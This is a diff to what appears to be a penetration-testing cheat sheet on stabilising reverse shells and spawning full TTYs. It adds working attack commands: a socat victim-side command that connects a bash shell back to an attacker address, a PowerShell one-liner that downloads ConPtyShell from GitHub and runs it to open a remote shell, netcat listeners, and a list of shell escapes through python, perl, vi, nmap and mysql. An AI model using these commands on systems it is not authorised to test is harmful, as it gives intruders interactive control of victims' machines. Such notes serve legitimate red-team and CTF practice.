@@ -1,17 +1,27 @@
+# rlwrap
+we can launch the listener on our machine by wrapping it
+with rlwrap, for example:
+rlwrap nc -nlvp 4242
+
 # Python
+## Within the reverse shell we may try to launch
+## bash with python, but it doesn't always give us
+## back a full tty shell
 python -c 'import pty; pty.spawn("/bin/bash")'
 
 # Socat
 ## Listener:
-socat file:`tty`,raw,echo=0 tcp-listen:4444
+socat file:`tty`,raw,echo=0 tcp-listen:4242
 ## Victim:
-socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:172.17.0.1:4242
 
 # STTY Options
+
 ## In reverse shell
 $ python -c 'import pty; pty.spawn("/bin/bash")'
 Ctrl-Z
-## On local machine after ctrl+z
+
+## On local machine after we have a reverse shell and have typed ctrl+z
 $ stty raw -echo
 $ fg
 ## In reverse shell
@@ -19,3 +29,30 @@ $ reset
 $ export SHELL=bash
 $ export TERM=xterm-256color
 $ stty rows <num> columns <cols>
+
+
+# Windows Full TTY
+## Offline version of the ps1 available at --> https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1
+Listener:
+stty raw -echo; (stty size; cat) | nc -lvnp 3001
+
+On Target:
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
+
+# Spawning TTY Terminals from different interpreters
+## Remember to give a look at gtfo and lolbins for
+## a comprehensive list
+/bin/sh -i
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+python3 -c "__import__('pty').spawn('/bin/bash')"
+python3 -c "__import__('subprocess').call(['/bin/bash'])"
+perl -e 'exec "/bin/sh";'
+perl: exec "/bin/sh";
+perl -e 'print `/bin/bash`'
+ruby: exec "/bin/sh"
+lua: os.execute('/bin/sh')
+
+- vi: `:!bash`
+- vi: `:set shell=/bin/bash:shell`
+- nmap: `!sh`
+- mysql: `! bash`
